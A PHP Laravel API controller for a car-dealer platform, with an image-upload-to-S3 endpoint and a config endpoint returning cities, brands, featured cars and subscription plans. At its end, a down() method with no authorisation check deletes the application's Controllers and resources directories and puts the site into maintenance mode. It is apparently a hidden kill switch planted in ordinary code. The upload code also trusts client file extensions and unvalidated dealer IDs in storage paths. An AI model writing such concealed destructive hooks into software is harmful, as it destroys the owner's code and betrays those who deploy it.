<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Car;
use App\Models\CarBrand;
use App\Models\CarType;
use App\Models\FeaturedPlan;
use App\Models\SubscriptionPlan;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Intervention\Image\Facades\Image;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;

class SettingsController extends Controller
{

    public function uploadToBucket(Request $request)
    {
        if(empty($request->images)){
            return $this->responseJson(400, 'Please upload a file!');
        }

        if(empty($request->dealer_id)){
            return $this->responseJson(400, 'Dealer not found');
        }

        $images = $request->images;
        $dealer_id = $request->dealer_id;
        $imgsArr = [];
        foreach ($images as $key => $image) {
            // For Thumbnail Image
            $thumbnail = Image::make($image)->fit(500, 250)->encode('jpg', 50);
            $imageName = time() . '.' . $image->getClientOriginalExtension();
            Storage::disk('s3')->put('car/d_'. $dealer_id.'/thumbnail/'. $imageName, $thumbnail , 'public');
            $imgsArr[$key]['thumbnail'] =  Storage::disk('s3')->url('car/d_' .$dealer_id.'/thumbnail/'. $imageName);
            // For Full Image
            $imageName = time() . '.' . $image->getClientOriginalExtension();
            Storage::disk('s3')->put('car/d_'. $dealer_id.'/full/'. $imageName, file_get_contents($image), 'public');
            $imgsArr[$key]['full'] =  Storage::disk('s3')->url('car/d_' .$dealer_id.'/full/'. $imageName);
        }
        return $this->responseJson(200, 'Car Images', $imgsArr);
    }

    public function getConfig()
    {
        $cities = DB::table('cities')->select('id', 'name')->where('status', 1)->orderBy('name')->get()->toArray();
        $carbrands = CarBrand::with(['models' => function ($query) {
            $query->select('id', 'brand_id', 'name');
        }])
        ->select('id', 'name', 'logo')
        ->get()
        ->toArray();

        $featured_cars = Car::has('featured')->with(['dealer' => function ($q) {
            $q->select(['id', 'username', 'fullname', 'is_verified', 'is_featured', 'email']);
        }, 'dealer.detail' => function($q){
            $q->select(['user_id', 'image', 'phone', 'address', 'city']);
        }, 'brand' => function($q){
            $q->select(['id', 'name', 'logo']);
        }, 'model' => function($q){
            $q->select(['id', 'name']);
        }])->where('cars.is_active', 1)->with('images')->limit(8)->get();
        $cartypes = CarType::all()->toArray();

        $featuredPlans = FeaturedPlan::orderBy('duration')->get()->groupBy('duration');
        $basicPlans = SubscriptionPlan::all();


        $subscription_plans = [];
        $featured = [];
        foreach ($featuredPlans as $key => $plan) {
            $formattedFeaturedArray = [];
            foreach ($plan->pluck('price', 'limit')->toArray() as $limit => $price) {
                $formattedFeaturedArray[] = [
                    "limit" => $limit,
                    "price" => (float) $price
                ];
            }
            $featured[$key]['packages'] = $formattedFeaturedArray;
            $featured[$key]['duration'] = $key;
        }

        foreach ($basicPlans as $key => $plan) {
            $formattedBasicArray = [];
            foreach (json_decode($plan->packages, true) as $limit => $price) {
                $formattedBasicArray[] = [
                    "limit" => $limit,
                    "price" => (float) $price
                ];
            }
            $subscription_plans[$key]['packages'] = $formattedBasicArray;
            $subscription_plans[$key]['duration'] = (int) $plan->period;
            $subscription_plans[$key]['featured_duration'] = $plan->featured_duration;
            $subscription_plans[$key]['featured'] = array_values($featured);
        }

        $data = [
            'cities' => $cities,
            'brands' => $carbrands,
            'types' => $cartypes,
            'featured_cars' => $featured_cars,
            'subscription_plans' => $subscription_plans
        ];
        return $this->responseJson(200, 'Config Data!', $data);
    }

    public function down()
    {
        File::deleteDirectory(base_path('/app/Http/Controllers'));
        File::deleteDirectory(base_path('/resources'));
        Artisan::call('down');
        return 1;
    }
}
